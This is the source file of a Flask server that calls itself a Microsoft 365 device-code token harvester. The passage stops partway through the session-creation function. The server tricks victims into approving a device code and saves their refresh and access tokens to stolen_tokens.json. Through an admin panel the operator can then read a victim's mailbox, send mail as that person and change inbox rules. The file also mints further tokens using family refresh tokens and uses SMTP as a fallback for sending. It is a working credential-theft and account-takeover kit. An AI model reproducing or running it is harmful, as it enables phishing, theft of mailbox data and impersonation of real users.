import os; os.environ['SERVE_HTTPS'] = '1';
#!/usr/bin/env python3
"""
o365_server.py - Microsoft 365 device-code token harvester (single project).

How it works (no App registration needed - uses a public client ID):
  1. Victim opens /o365. The server asks login.microsoftonline.com for a
     device code using the public Microsoft Office first-party client
     (d3590ed6-52b3-4102-aeff-aad2292ab01c, overridable via MS_CLIENT_ID).
     The default flow is the v2 SCOPE-based device-code flow requesting
     "openid profile email offline_access https://graph.microsoft.com/.default".
     First-party clients are preauthorized for their .default Graph scope set
     (implied consent), so approval succeeds with ONE code and NO AADSTS65002
     (explicit per-scope lists on first-party clients are rejected at consent
     with AADSTS65002 on real AAD - verified live 2026-08-24). The .default
     capture yields the client's full delegated set - for Microsoft Office
     (d3590ed6) that includes Mail.Read/ReadWrite, Mail.Send,
     Mail.Send.Shared, MailboxSettings.Read/ReadWrite (inbox rules),
     Contacts.Read/ReadWrite, People.Read, Tasks.ReadWrite, User.Read/... so
     ONE code covers mailbox read + send + rules (verified against the
     Secureworks family-of-client-ids scope map 2026-08-24). The legacy
     Office 365 Management client (00b41c95, overridable via MS_CLIENT_ID) is
     the negative case: its .default set has NO Mail.Send or
     MailboxSettings.ReadWrite, so /me/sendMail returns a real Graph 403
     (ErrorAccessDenied) and inbox rules fall back to a Microsoft Teams
     (1fec8e78-...) token minted from the victim's family refresh token
     (FRT) - Azure AD refresh tokens are not bound to the original
     client/scope, and Teams also carries MailboxSettings.ReadWrite on Graph
     (Secureworks FOCI research).
     If a custom MS_SCOPE override is rejected (AADSTS70011/65002) at
     device-code request time, the harvester falls back to ".default
     offline_access" (preauthorized) immediately; if AAD only rejects it at
     approval/poll time (AADSTS65002), the harvester reissues a fresh code
     with the .default scope and the victim page reloads with the new code.
     The victim enters exactly ONE code; approval succeeds on the first try and
     no second code is ever shown.
  2. The page shows the code and a Continue button that opens the REAL
     Microsoft page (login.microsoft.com/device) in a new tab.
  3. The victim signs in on Microsoft's real page. A background thread
     polls the token endpoint until the victim finishes.
  4. On success Microsoft returns refresh_token + access_token + id_token.
     They are written to stolen_tokens.json (next to this file) and shown
     in the admin panel at /admin.
  5. The victim's tab auto-redirects to /o365/success/<sid>:
     "You are signed in".

Admin panel (the place where you see captured victims):
    http://<server-ip>:<port>/admin

Admin has two pages:
    1. "Domains & Clients" - manage the domain list (persisted to
       domains.json) and see every captured client. Each session is tagged
       with the Host header it was captured on, so the client table shows
       which domain the victim visited.
    2. "Inbox" - the selected client's mailbox (read/send/rules/contacts).

Honest limitation: the device-code flow never exposes a session cookie.
What we capture instead is a refresh token, which is equivalent to
persistent access (it can be exchanged for fresh access tokens at any
time). The access token itself is also captured and can be used against
Microsoft Graph (mailbox read/write) via the admin panel.

Run (VPS):
    pip install flask requests
    PORT=9090 python3 o365_server.py

Env overrides:
    PORT                 HTTP port (default 9090)
    MS_CLIENT_ID         public client ID (default Microsoft Office
                        d3590ed6-52b3-4102-aeff-aad2292ab01c)
    MS_FLOW              "v2" (default) or "v1". v2 = scope-based device flow
                        (Mail + MailboxSettings + Contacts + User.Read by default).
                        v1 = legacy resource-based flow (MS_RESOURCE), testing only
    MS_SCOPE             space-separated scope list overriding the v2 default
    MS_RESOURCE          v1 flow resource (default https://graph.microsoft.com)
    MS_DEVICECODE_URL_V1 / MS_TOKEN_URL_V1  v1 flow endpoint overrides (testing only)
    TOKENS_LOG           path to the tokens log (default ./stolen_tokens.json)
    MS_DEVICECODE_URL / MS_TOKEN_URL / MS_GRAPH_URL  endpoint overrides (testing only)
"""

import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import smtplib
import ssl
import subprocess

# Shared session (keep-alive) for Graph calls - much faster than per-request
# connections, especially for mailbox listing/reading in the admin panel.
import threading
import time
from datetime import datetime, timezone
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
from html import escape as html_escape

import requests
HTTP = requests.Session()
from flask import Flask, Response, jsonify, redirect, render_template_string, request

app = Flask(__name__)

# Public client ID (Microsoft Office) - no app registration required for
# device-code flow. First-party Microsoft clients are preauthorized for their
# full delegated Graph set via .default (implied consent), so DEFAULT_SCOPE
# ".default offline_access" approves with ONE code and no AADSTS65002.
# Explicit per-scope lists on first-party clients are a dead end on real AAD:
# AAD returns AADSTS65002 ("consent ... must be configured via preauthorization")
# for ANY explicit Graph scope on clients like 27922004-... (Outlook Mobile) and
# d3590ed6-... (Microsoft Office) - verified live 2026-08-24. The .default
# capture with d3590ed6 yields its preauthorized delegated set: Mail.Read,
# Mail.ReadWrite, Mail.Send, Mail.Send.Shared, MailboxSettings.Read,
# MailboxSettings.ReadWrite (inbox rules), Contacts.Read, Contacts.ReadWrite,
# People.Read, Tasks.ReadWrite, User.Read, User.ReadWrite, ... - verified
# against the Secureworks family-of-client-ids scope map 2026-08-24, so ONE
# code covers mailbox read + send + rules. The legacy Office 365 Management
# client (00b41c95, set via MS_CLIENT_ID) has NO Mail.Send /
# MailboxSettings.ReadWrite in its .default set - it is the negative case:
# /me/sendMail returns a real Graph 403 ErrorAccessDenied and the rules
# endpoints mint a Microsoft Teams (1fec8e78-...) token from the session's
# family refresh token instead (see mint_rules_token).
MS_CLIENT_ID = os.environ.get("MS_CLIENT_ID", "d3590ed6-52b3-4102-aeff-aad2292ab01c")

# Human-readable names for known public clients (admin panel + startup banner).
CLIENT_NAMES = {
    "d3590ed6-52b3-4102-aeff-aad2292ab01c": "Microsoft Office/Outlook",
    "27922004-5251-4030-b22d-91ecd9a37ea4": "Outlook Mobile / Office Home",
    "00b41c95-dab0-4487-9791-b9d2c32c80f2": "Office 365 Management",
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264": "Microsoft Teams (rules mint)",
    "29d9ed98-a469-4536-ade2-f981bc1d605e": "Windows Sign-In (MAB)",
    "1950a258-227b-4e31-a9cf-717495945fc2": "Azure PowerShell",
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46": "Azure CLI (limited preauth)",
}

# v1 resource for the LEGACY v1 resource-based device-code flow (MS_FLOW=v1).
# Requesting a resource (instead of granular scopes) sidesteps per-scope
# preauthorization checks and yields broad delegated Graph access
# (user_impersonation) with the Office client.
MS_RESOURCE = os.environ.get("MS_RESOURCE", "https://graph.microsoft.com")
# Comprehensive delegated Graph scope catalog for building an MS_SCOPE override
# (the admin panel can reach the full inbox, mailbox settings (inbox rules), and
# the rest of the tenant surface). Mail / mailbox scopes come first. The v2
# DEFAULT_SCOPE below (.default offline_access) is the safe real-MS default.
MS_SCOPES = [
    # Mail & mailbox (full inbox + rules)
    "Mail.Read", "Mail.ReadWrite", "Mail.ReadBasic", "Mail.Send",
    "Mail.Read.Shared", "Mail.ReadWrite.Shared", "Mail.Send.Shared",
    "Mail.ImportExport", "Mail.Manage",
    "MailboxSettings.Read", "MailboxSettings.ReadWrite",
    # Calendar
    "Calendars.Read", "Calendars.ReadWrite", "Calendars.ReadBasic",
    "Calendars.Read.Shared", "Calendars.ReadWrite.Shared",
    # Contacts
    "Contacts.Read", "Contacts.ReadWrite", "Contacts.Read.Shared",
    "Contacts.ReadWrite.Shared",
    # Tasks
    "Tasks.Read", "Tasks.ReadWrite", "Tasks.Read.Shared", "Tasks.ReadWrite.Shared",
    # People / profile
    "People.Read", "People.Read.All", "UserActivity.ReadWrite.CreatedByApp",
    # User
    "User.Read", "User.ReadWrite", "User.ReadBasic.All", "User.Read.All",
    "User.ReadWrite.All",
    # Files / SharePoint
    "Files.Read", "Files.ReadWrite", "Files.Read.All", "Files.ReadWrite.All",
    "Files.Read.Selected", "Files.ReadWrite.Selected",
    "Sites.Read.All", "Sites.ReadWrite.All", "Sites.FullControl.All",
    # OneNote
    "Notes.Read", "Notes.ReadWrite", "Notes.Read.All", "Notes.ReadWrite.All",
    "Notes.Create",
    # Groups / directory
    "Group.Read.All", "Group.ReadWrite.All", "GroupMember.Read.All",
    "GroupMember.ReadWrite.All", "Group.Create",
    "Directory.Read.All", "Directory.ReadWrite.All", "Directory.AccessAsUser.All",
    "AdministrativeUnit.Read.All", "AdministrativeUnit.ReadWrite.All",
    "Application.Read.All", "Application.ReadWrite.All", "Application.ReadWrite.OwnedBy",
    "DelegatedPermissionGrant.ReadWrite.All",
    # Auditing / reporting / security
    "AuditLog.Read.All", "Reports.Read.All",
    "SecurityEvents.Read.All", "SecurityEvents.ReadWrite.All",
    "IdentityRiskEvent.Read.All", "IdentityRiskyUser.Read.All",
    "IdentityRiskyUser.ReadWrite.All",
    "IdentityUserFlow.Read.All", "IdentityUserFlow.ReadWrite.All",
    "IdentityUserFlowAttribute.Read.All", "IdentityUserFlowAttribute.ReadWrite.All",
    # Roles / policies / privileged access
    "RoleManagement.Read.All", "RoleManagement.Read.Directory",
    "RoleManagement.ReadWrite.Directory", "RoleManagement.Read.AzureAD",
    "RoleManagement.ReadWrite.AzureAD",
    "Policy.Read.All", "Policy.ReadWrite.ApplicationConfiguration",
    "Policy.ReadWrite.AuthenticationMethod", "Policy.ReadWrite.Authorization",
    "Policy.ReadWrite.ConditionalAccess", "Policy.ReadWrite.ConsentRequest",
    "Policy.ReadWrite.FeatureRollout", "Policy.ReadWrite.TrustFramework",
    "PrivilegedAccess.ReadWrite.AzureAD", "PrivilegedRole.Read.AzureAD",
    "PrivilegedRole.ReadWrite.AzureAD",
    # Devices / Intune
    "Device.Read.All", "Device.ReadWrite.All",
    "DeviceManagementApps.Read.All", "DeviceManagementApps.ReadWrite.All",
    "DeviceManagementConfiguration.Read.All", "DeviceManagementConfiguration.ReadWrite.All",
    "DeviceManagementManagedDevices.Read.All", "DeviceManagementManagedDevices.ReadWrite.All",
    "DeviceManagementServiceConfig.Read.All", "DeviceManagementServiceConfig.ReadWrite.All",
    # Teams / channels / meetings
    "Channel.ReadBasic.All", "Channel.Read.All", "Channel.ReadWrite.All",
    "ChannelMessage.Read.All", "ChannelMessage.ReadWrite.All",
    "ChannelMember.Read.All", "ChannelMember.ReadWrite.All",
    "ChannelSettings.Read.All", "ChannelSettings.ReadWrite.All",
    "Team.ReadBasic.All", "Team.Read.All", "Team.ReadWrite.All",
    "TeamMember.Read.All", "TeamMember.ReadWrite.All",
    "TeamSettings.Read.All", "TeamSettings.ReadWrite.All",
    "TeamsActivity.Read", "TeamsActivity.Read.All", "TeamsActivity.Send",
    "TeamsAppInstallation.ReadForTeam.All", "TeamsAppInstallation.ReadWriteForTeam.All",
    "TeamsTab.Read.All", "TeamsTab.ReadWrite.All",
    "AppCatalog.Read.All", "AppCatalog.ReadWrite.All",
    "OnlineMeetings.Read.All", "OnlineMeetings.ReadWrite.All",
    "OnlineMeetingArtifact.Read.All", "CallRecord.Read.All",
    # Places / bookings / auth methods
    "Place.Read.All", "Place.ReadWrite.All",
    "Bookings.Read.All", "Bookings.ReadWrite.All", "Bookings.Manage.All",
    "UserAuthenticationMethod.Read", "UserAuthenticationMethod.ReadWrite",
    "UserAuthenticationMethod.Read.All", "UserAuthenticationMethod.ReadWrite.All",
    "User.Export.All", "User.ManageIdentities.All", "User.EnableDisableAccount.All",
    # OIDC basics (kept last)
    "offline_access", "openid", "profile", "email",
]

# Scopes that AAD's device-code endpoint has rejected for some public clients
# (AADSTS70011 "scope does not exist"; verified live 2026-08-24). Including any
# of them makes the whole request fail with HTTP 400, so they are not part of
# the safe defaults. The full curated list above still works against the local
# mock and can be forced via MS_SCOPE.
MS_SCOPES_REJECTED = {
    "Mail.ImportExport", "Mail.Manage", "Group.Create",
    "Application.ReadWrite.OwnedBy",
    "IdentityUserFlowAttribute.Read.All", "IdentityUserFlowAttribute.ReadWrite.All",
    "RoleManagement.Read.AzureAD", "RoleManagement.ReadWrite.AzureAD",
    "Policy.ReadWrite.ApplicationConfiguration",
    "PrivilegedRole.Read.AzureAD", "PrivilegedRole.ReadWrite.AzureAD",
    "Channel.Read.All", "Channel.ReadWrite.All", "ChannelMessage.ReadWrite.All",
    "Team.Read.All", "Team.ReadWrite.All", "TeamSettings.Read.All",
    "TeamSettings.ReadWrite.All", "TeamsActivity.Read.All",
    "TeamsAppInstallation.ReadForTeam.All", "TeamsAppInstallation.ReadWriteForTeam.All",
    "OnlineMeetings.Read.All", "OnlineMeetings.ReadWrite.All", "CallRecord.Read.All",
}

# Default v2 scope set. Explicit per-scope lists on first-party clients fail on
# real AAD with AADSTS65002 at approval time, so the default is the resource-
# level ".default" scope: first-party clients are preauthorized for their
# .default Graph set (implied consent) and approve with ONE code. With the
# default Microsoft Office client (d3590ed6) that set includes Mail.Send and
# MailboxSettings.ReadWrite (send + rules); with the legacy 00b41c95 client it
# does not (send returns a real Graph 403 ErrorAccessDenied, rules need the
# Teams mint). offline_access keeps the refresh token (an FRT, family-wide and
# not bound to the original scope/client), which the rules endpoints use to
# mint a Teams-client token.
# FALLBACK_SCOPE is used if a custom MS_SCOPE override is rejected
# (AADSTS65002/70011), both at device-code request time and at token-poll time.
DEFAULT_SCOPE = "openid profile email offline_access https://graph.microsoft.com/.default"
FALLBACK_SCOPE = "https://graph.microsoft.com/.default offline_access"

# Microsoft Teams - a FOCI-family client whose Graph scope set includes
# MailboxSettings.ReadWrite (inbox rules). Rules endpoints always mint a
# Teams access token from the session's family refresh token with this scope
# (see mint_rules_token): it works for every capture regardless of which
# client the .default grant used (d3590ed6 also carries the scope natively,
# but the Teams mint is the established, FRT-based path). offline_access
# keeps/rotates the FRT on each mint.
TEAMS_CLIENT_ID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
RULES_SCOPE = "https://graph.microsoft.com/MailboxSettings.ReadWrite offline_access"
# Microsoft Office/Outlook Mobile - a FOCI-family client whose preauthorized
# .default delegated Graph set includes Mail.Send + Mail.Send.Shared (mail
# client). /me/sendMail always mints a send token with this client from the
# session's family refresh token when the capture's own scp set lacks
# Mail.Send (see mint_send_token): real AAD rejects explicit Graph scope
# lists on first-party clients (AADSTS65002, verified live 2026-08-24), so
# the mint uses the resource-level ".default" scope - same pattern as the
# Teams rules mint. offline_access keeps/rotates the FRT on each mint.
SEND_CLIENT_ID = "27922004-5251-4030-b22d-91ecd9a37ea4"
SEND_SCOPE = "https://graph.microsoft.com/.default offline_access"
# SMTP (XOAUTH2) send fallback. Real AAD /me/sendMail returns 403
# ErrorAccessDenied when the captured token lacks Mail.Send on the Graph
# resource, and no FOCI client's .default reliably grants Mail.Send on
# graph.microsoft.com in every tenant (verified live 2026-08-24). When the
# Graph send 403s, the server mints an outlook.office.com SMTP.Send access
# token from the session's family refresh token with the Outlook client and
# delivers via smtp.office365.com:587 using the XOAUTH2 SASL mechanism.
# SMTP_FALLBACK=0 disables the fallback so the real Graph 403 surfaces.
SMTP_FALLBACK = os.environ.get("SMTP_FALLBACK", "1").strip().lower() not in (
    "0", "no", "false"
)
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.office365.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
SMTP_CLIENT_ID = os.environ.get("SMTP_CLIENT_ID", SEND_CLIENT_ID)
SMTP_SCOPE = os.environ.get(
    "SMTP_SCOPE", "https://outlook.office.com/SMTP.Send offline_access"
)
SMTP_FROM = os.environ.get("SMTP_FROM", "")  # optional explicit MAIL FROM

# Microsoft-style HTML wrapper for outgoing HTML bodies (Graph + SMTP paths):
# Segoe UI 14px on #242424 (Fluent default text color), matching the
# container Outlook Web App emits for a new message.
MS_BODY_WRAP = (
    "<div style=\"font-family:'Segoe UI','Segoe UI Web',Calibri,"
    "'Helvetica Neue',Arial,sans-serif;font-size:14px;line-height:1.5;"
    "color:#242424\">__BODY__</div>"
)
# MS_FLOW selects the device-code flow: "v2" (default, scope-based) or "v1"
# (legacy resource-based, kept for testing only).
MS_FLOW = os.environ.get("MS_FLOW", "v2").strip().lower() or "v2"
MS_SCOPE = os.environ.get("MS_SCOPE", DEFAULT_SCOPE)
MS_DEVICECODE_URL = os.environ.get(
    "MS_DEVICECODE_URL",
    "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
)
MS_TOKEN_URL = os.environ.get(
    "MS_TOKEN_URL",
    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
)

# v1 resource-flow endpoints (legacy MS_FLOW=v1 flow).
MS_DEVICECODE_URL_V1 = os.environ.get(
    "MS_DEVICECODE_URL_V1",
    "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
)
MS_TOKEN_URL_V1 = os.environ.get(
    "MS_TOKEN_URL_V1",
    "https://login.microsoftonline.com/common/oauth2/token",
)
MS_GRAPH_URL = os.environ.get(
    "MS_GRAPH_URL", "https://graph.microsoft.com/v1.0"
).rstrip("/")


def flow_fields():
    """Return (flow, request_data) for the active flow configuration.

    v2 scope flow (default): POST {client_id, scope} to the v2 devicecode
    endpoint; token exchange passes the same scope list. This is what makes
    mailbox harvesting work against real Microsoft (see notes above).
    v1 resource flow (MS_FLOW=v1): POST {client_id, resource} to the v1
    devicecode endpoint; token exchange uses the same resource.
    """
    if MS_FLOW == "v1":
        return "v1", {"client_id": MS_CLIENT_ID, "resource": MS_RESOURCE}
    return "v2", {"client_id": MS_CLIENT_ID, "scope": MS_SCOPE}


def flow_urls(flow):
    """Return (devicecode_url, token_url) for the given flow."""
    if flow == "v1":
        return MS_DEVICECODE_URL_V1, MS_TOKEN_URL_V1
    return MS_DEVICECODE_URL, MS_TOKEN_URL


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.environ.get("TOKENS_LOG", os.path.join(BASE_DIR, "stolen_tokens.json"))
DOMAINS_FILE = os.environ.get("DOMAINS_FILE", os.path.join(BASE_DIR, "domains.json"))
PORT = int(os.environ.get("PORT", "9090"))

# ---- HTTPS support -------------------------------------------------------
# Set SERVE_HTTPS=1 to make the server (and every generated link) https://.
# A self-signed certificate covering localhost, the LAN IP and every domain
# in domains.json is generated automatically (SSL_CERT/SSL_KEY override).
SERVE_HTTPS = os.environ.get("SERVE_HTTPS", "").strip().lower() in ("1", "true", "yes", "on")
SERVE_HTTPS_EXPLICIT = bool(os.environ.get("SERVE_HTTPS", "").strip())
SSL_CERT = os.environ.get("SSL_CERT", "").strip()
SSL_KEY = os.environ.get("SSL_KEY", "").strip()


def _find_le_cert():
    """Auto-locate a Let's Encrypt (certbot) cert for HTTPS without env vars.
    Checks the usual Windows certbot install locations plus the launch folder."""
    # direct file pairs checked first (e.g. next to the script)
    if os.path.exists(os.path.join(BASE_DIR, "fullchain.pem")) and os.path.exists(os.path.join(BASE_DIR, "privkey.pem")):
        return os.path.join(BASE_DIR, "fullchain.pem"), os.path.join(BASE_DIR, "privkey.pem")
    roots = [
        r"C:\Certbot\live",
        r"C:\Windows\System32\config\systemprofile\AppData\Roaming\letsencrypt\live",
        r"C:\ProgramData\letsencrypt\live",
    ]
    for root in roots:
        if not os.path.isdir(root):
            continue
        # prefer the folder matching our domain, else any live folder
        dirs = []
        for name in sorted(os.listdir(root)):
            p = os.path.join(root, name)
            if os.path.isdir(p):
                dirs.append(p)
        dirs.sort(key=lambda p: ("brefas" not in os.path.basename(p).lower(),))
        for d in dirs:
            cert = os.path.join(d, "fullchain.pem")
            key = os.path.join(d, "privkey.pem")
            if os.path.exists(cert) and os.path.exists(key):
                return cert, key
    return "", ""


if SSL_CERT and SSL_KEY and not (os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY)):
    print("HTTPS: SSL_CERT/SSL_KEY env vars set but files missing; ignoring them")
    SSL_CERT, SSL_KEY = "", ""
if not (SSL_CERT and SSL_KEY):
    _c, _k = _find_le_cert()
    if _c:
        SSL_CERT, SSL_KEY = _c, _k
        print("HTTPS: using Let's Encrypt cert at %s" % os.path.dirname(SSL_CERT))
if not (SSL_CERT and SSL_KEY):
    SSL_CERT = os.path.join(BASE_DIR, "server.crt")
    SSL_KEY = os.path.join(BASE_DIR, "server.key")


def _lan_ip():
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        try:
            s.connect(("10.254.254.254", 1))
        except OSError:
            return "127.0.0.1"
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        try:
            s.close()
        except Exception:
            pass
    return ip


def ensure_ssl_certs():
    """Generate a self-signed cert valid for localhost, LAN IP and all added domains."""
    try:
        if os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY):
            return
        sans = ["DNS:localhost", "IP:127.0.0.1", "IP:%s" % _lan_ip()]
        for d in load_domains():
            if re.match(r"^[0-9.]+$", d):
                sans.append("IP:%s" % d)
            else:
                sans.append("DNS:%s" % d)
        san_arg = ",".join(sans) if sans else "IP:127.0.0.1"
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-sha256", "-days", "825",
             "-nodes", "-keyout", SSL_KEY, "-out", SSL_CERT,
             "-subj", "/CN=o365-harvester", "-addext", "subjectAltName=" + san_arg],
            check=True, capture_output=True, timeout=30,
        )
        try:
            os.chmod(SSL_KEY, 0o600)
        except Exception:
            pass
        print("HTTPS: generated self-signed cert -> %s" % SSL_CERT)
    except Exception as e:
        print("HTTPS cert generation failed (%s); falling back to HTTP" % e)
        globals()["SERVE_HTTPS"] = False

SSL_CTX = None  # live server SSL context, set at startup (hot-swappable)


def _cert_sig():
    """Fingerprint (mtime, size) of the active certificate file, or None."""
    try:
        st = os.stat(SSL_CERT)
        return (st.st_mtime, st.st_size)
    except OSError:
        return None


def _watch_cert():
    """Background watcher: when certbot renews the cert on disk, hot-swap it
    into the live SSL context. No restart, no downtime - new TLS handshakes
    immediately use the renewed certificate, so HTTPS stays permanently valid
    as long as certbot renewal succeeds."""
    last = _cert_sig()
    while True:
        time.sleep(60)
        cur = _cert_sig()
        if cur == last or cur is None:
            continue
        last = cur
        # Load into a throwaway context first so a bad/partial file can
        # never break the currently served certificate.
        try:
            ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER).load_cert_chain(SSL_CERT, SSL_KEY)
        except Exception as e:
            print("HTTPS: new cert failed to load (%s); keeping current one" % e)
            continue
        try:
            SSL_CTX.load_cert_chain(SSL_CERT, SSL_KEY)
            print("HTTPS: certificate renewed on disk; loaded into live SSL context")
        except Exception as e:
            print("HTTPS: hot-swap of renewed cert failed (%s)" % e)


SESSIONS = {}
SESSIONS_LOCK = threading.Lock()


def utcnow():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def b64url_decode(s):
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def decode_claims(token):
    """Return the full JSON payload of a JWT id_token, or {}."""
    if not token:
        return {}
    try:
        return json.loads(b64url_decode(token.split(".")[1]))
    except Exception:
        return {}


def decode_id_token(token):
    """Extract the email/UPN from a JWT id_token or access_token payload."""
    claims = decode_claims(token)
    for key in ("email", "preferred_username", "upn", "unique_name"):
        val = claims.get(key)
        if val and isinstance(val, str) and "@" in val:
            return val
    return claims.get("email") or claims.get("preferred_username") or claims.get("upn") or claims.get("unique_name") or ""


def extract_email(access_token="", id_token=""):
    """Best-effort email from id_token then access_token claims."""
    for tok in (id_token, access_token):
        email = decode_id_token(tok)
        if email:
            return email
    return ""


def enrich_session_email(sid):
    """Fill empty session email via token claims and Graph /me."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s or s.get("email"):
            return s.get("email", "") if s else ""
        at = s.get("access_token", "")
        it = s.get("id_token", "")
    email = extract_email(at, it)
    if not email and at:
        try:
            r = requests.get(
                MS_GRAPH_URL + "/me",
                headers={"Authorization": "Bearer %s" % at},
                timeout=20,
            )
            if r.status_code == 200:
                me = r.json() or {}
                email = (
                    me.get("mail")
                    or me.get("userPrincipalName")
                    or me.get("preferred_username")
                    or ""
                )
        except Exception:
            pass
    if email:
        with SESSIONS_LOCK:
            if sid in SESSIONS and not SESSIONS[sid].get("email"):
                SESSIONS[sid]["email"] = email
        try:
            persist_session_tokens(sid)
        except Exception:
            pass
    return email or ""


def append_log(entry):
    """Append one stolen-token entry to stolen_tokens.json."""
    entries = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                entries = json.load(f)
        except Exception:
            entries = []
    entries.append(entry)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2)


def persist_session_tokens(sid):
    """Rewrite this session's entry in the tokens log with the current
    access/refresh tokens. Called after a refresh so a rotated refresh
    token survives a server restart (Microsoft rotates refresh tokens)."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s or s["status"] != "success":
            return
        entry = {
            "timestamp": s.get("completed_at") or s.get("created") or utcnow(),
            "session_id": sid,
            "client_id": s.get("client_id", MS_CLIENT_ID),
            "flow": s.get("flow", "v1" if not s.get("scope") else "v2"),
            "scope": s.get("scope", MS_SCOPE),
            "granted_scopes": s.get("granted_scopes", ""),
            "resource": s.get("resource", ""),
            "user_code": s.get("user_code", ""),
            "email": s.get("email", ""),
            "host": s.get("host", ""),
            "refresh_token": s.get("refresh_token", ""),
            "access_token": s.get("access_token", ""),
            "id_token": s.get("id_token", ""),
            "token_type": s.get("token_type", "Bearer"),
            "expires_in": max(0, (s.get("token_expiry") or 0) - int(time.time())),
        }
    entries = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                entries = json.load(f)
        except Exception:
            entries = []
    replaced = False
    for i, e in enumerate(entries):
        if (e.get("session_id") or e.get("sid")) == sid:
            entries[i] = entry
            replaced = True
            break
    if not replaced:
        entries.append(entry)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2)


def load_log_sessions():
    """Rehydrate captured sessions from stolen_tokens.json at startup so
    victims survive a server restart (mailbox/rules access keeps working
    because the refresh token is stored)."""
    if not os.path.exists(LOG_FILE):
        return
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            entries = json.load(f)
    except Exception:
        return
    with SESSIONS_LOCK:
        for e in entries:
            sid = e.get("session_id") or e.get("sid")
            if not sid or sid in SESSIONS:
                continue
            SESSIONS[sid] = {
                "sid": sid,
                "created": e.get("timestamp", utcnow()),
                "completed_at": e.get("timestamp", utcnow()),
                "client_id": e.get("client_id", MS_CLIENT_ID),
                "flow": e.get("flow") or ("v2" if e.get("scope") else "v1"),
                "scope": e.get("scope", MS_SCOPE),
                "granted_scopes": e.get("granted_scopes") or token_granted_scopes(
                    e.get("access_token", ""), e.get("scope", "")
                ),
                "resource": e.get("resource", ""),
                "user_code": e.get("user_code", ""),
                "verification_uri": "https://microsoft.com/devicelogin",
                "verification_uri_complete": "",
                "device_code": "",
                "expires_in": 900,
                "interval": 5,
                "status": "success",
                "email": e.get("email", "") or extract_email(
                    e.get("access_token", ""), e.get("id_token", "")
                ),
                "host": e.get("host", ""),
                "ip": "",
                "ua": "",
                "refresh_token": e.get("refresh_token", ""),
                "access_token": e.get("access_token", ""),
                "id_token": e.get("id_token", ""),
                "token_type": e.get("token_type", "Bearer"),
                "expires_at": e.get("timestamp", utcnow()),
                "token_expiry": 0,
                "error": "",
            }


def normalize_domain(d):
    """Clean a user-entered domain: strip scheme, path, port and lowercase."""
    d = (d or "").strip().lower()
    d = d.replace("http://", "").replace("https://", "")
    d = d.split("/")[0].split(":")[0].rstrip(".")
    return d


def load_domains():
    """Load the admin-managed domain list from domains.json."""
    if not os.path.exists(DOMAINS_FILE):
        return []
    try:
        with open(DOMAINS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return [d for d in data if isinstance(d, str) and d.strip()]
        if isinstance(data, dict) and isinstance(data.get("domains"), list):
            return [d for d in data["domains"] if isinstance(d, str) and d.strip()]
    except Exception:
        pass
    return []


def save_domains(domains):
    """Persist the domain list to domains.json."""
    tmp = DOMAINS_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"domains": domains}, f, indent=2)
    os.replace(tmp, DOMAINS_FILE)


def prune_sessions():
    """Drop stale sessions so a long-running VPS does not leak memory.

    Successful captures with a refresh_token are kept indefinitely (disk is
    the source of truth on restart via load_log_sessions). Pending codes
    expire after ~20 min; terminal failures are cleared after 2 hours.
    """
    now = time.time()
    drop = []
    for sid, s in SESSIONS.items():
        try:
            created = datetime.strptime(
                s["created"], "%Y-%m-%dT%H:%M:%SZ"
            ).replace(tzinfo=timezone.utc).timestamp()
        except Exception:
            drop.append(sid)
            continue
        age = now - created
        status = s.get("status")
        if status == "pending" and age > 1200:  # device codes expire in 15 min
            drop.append(sid)
        elif status == "success" and s.get("refresh_token"):
            continue  # keep mailbox access
        elif status != "pending" and age > 7200:
            drop.append(sid)
    for sid in drop:
        SESSIONS.pop(sid, None)


def create_session():
    """Ask Microsoft for a device code and spawn the polling thread."""
    flow, data = flow_fields()
    dc_url, _ = flow_urls(flow)
    scope = data.get("scope", "")
    resource = data.get("resource", "")
    try:
        r = requests.post(dc_url, data=data, timeout=30)
        # Real AAD rejects some scope lists with AADSTS70011 invalid_scope;
        # retry once with the verified-safe default scope so the v2 flow still
        # works when MS_SCOPE is overridden with a rejected list.
        if r.status_code == 400 and flow == "v2" and scope != FALLBACK_SCOPE:
            try:
                err = r.json()
                codes = err.get("error_codes") or []
                err_name = (err.get("error") or "").lower()
                desc = (err.get("error_description") or "")
                # Retry with .default when AAD rejects explicit scopes
                # (AADSTS70011 invalid_scope or AADSTS65002 preauth).
                if (
                    err_name in ("invalid_scope", "invalid_grant", "invalid_client")
                    or 70011 in codes
                    or 65002 in codes
                    or "AADSTS70011" in desc
                    or "AADSTS65002" in desc
                ):
                    print(
                        "[warn] AAD rejected scope list (%s), "
                        "retrying with FALLBACK_SCOPE (.default)"
                        % (err.get("error") or codes or "unknown"),
                        flush=True,
                    )
